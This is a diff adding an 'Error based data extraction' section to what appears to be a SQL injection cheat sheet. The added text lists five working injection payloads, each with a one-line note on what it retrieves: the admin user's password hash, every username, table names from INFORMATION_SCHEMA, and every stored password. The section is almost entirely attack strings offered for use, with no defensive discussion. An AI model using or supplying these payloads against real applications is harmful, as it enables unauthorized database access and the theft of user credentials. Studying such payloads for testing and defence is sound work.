@@ -128,3 +128,27 @@ Examples:
 
 
 ### Error based data extraction
+
+Following previous cenarios:
+
+ 1. `'or 1 in (select password from users where username ='admin') -- //`
+ 
+	It will return the hashed password of the admin user.
+
+	Any field or user can be obtained
+
+2. `'or 1 in (select username from users where id=1) -- //`
+
+	It will return all usernames stored in the users' table.
+	
+3. `'or 1=CAST((select group_concat(name) from INFORMATION_SCHEMA.INNODB_TABLES) AS SIGNED)-- //` 
+
+	Lists the tables of the information_schema first database.
+
+4. `'or 1=CAST((select group_concat(username) from users) AS SIGNED)-- //` 
+
+	Lists the usernames of all users stored in the users' table.
+
+5. `'or 1=CAST((select group_concat(password) from users) AS SIGNED)-- //` 
+
+	Lists the passwords of all users stored in the users' table.
